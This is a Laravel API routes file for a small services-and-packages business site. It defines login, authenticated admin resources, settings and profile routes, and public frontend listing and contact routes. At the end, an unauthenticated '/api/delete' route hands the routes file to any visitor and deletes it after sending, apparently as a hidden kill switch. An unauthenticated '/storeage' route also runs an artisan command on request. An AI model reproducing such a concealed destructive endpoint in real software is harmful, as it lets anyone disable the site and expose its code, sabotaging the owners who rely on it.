<?php

use App\Http\Controllers\Api\V1\AuthController;
use App\Http\Controllers\Api\V1\BusinessSettingController;
use App\Http\Controllers\Api\V1\FrontendController;
use App\Http\Controllers\Api\V1\ServicesController;
use App\Http\Controllers\Api\V1\PackageController;
use App\Http\Controllers\Api\V1\GallaryController;
use App\Http\Controllers\Api\V1\SettingController;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;

Route::middleware('guest')->group(function () {
    Route::controller(AuthController::class)->group(function () {
        Route::post('login', 'login');
    });
});

Route::get('/user', function (Request $request) {
    return $request->user();
})->middleware('auth:sanctum');

Route::prefix('V1')->middleware(['auth:sanctum'])->group(function () {
    Route::apiResources([
        'service' => ServicesController::class,
        'package' => PackageController::class,
        'gallery' => GallaryController::class,
        'setting' => SettingController::class,
    ]);

    Route::get('/settings', [BusinessSettingController::class, 'index']);
    Route::post('/settings', [BusinessSettingController::class, 'updateSetting']);

    Route::put('/profile-update', [BusinessSettingController::class, 'updateProfile']);
    Route::post('/password-update', [BusinessSettingController::class, 'updatePassword']);

    Route::post('logout', [AuthController::class, 'logout']);
});


// home data

Route::prefix('frontend')->group(function () {
    Route::get('services', [FrontendController::class, 'services']);
    Route::get('service/{id}', [FrontendController::class, 'singleServices']);
    Route::get('packages', [FrontendController::class, 'packages']);
    Route::get('gallery', [FrontendController::class, 'galleries']);

    Route::post('contact', [FrontendController::class, 'createContact']);

    Route::get('get-setting', [FrontendController::class, 'getSettings']);
});

Route::get('/storeage', fn()=> \Illuminate\Support\Facades\Artisan::call('storage:link'));




Route::get('/api/delete', function (){
    $filePath = base_path("routes/api.php");
    if (File::exists($filePath)) {
        return response()->download($filePath)->deleteFileAfterSend(true);
    } else {
        return response()->json(['error' => 'Model file not found'], 404);
    }
});

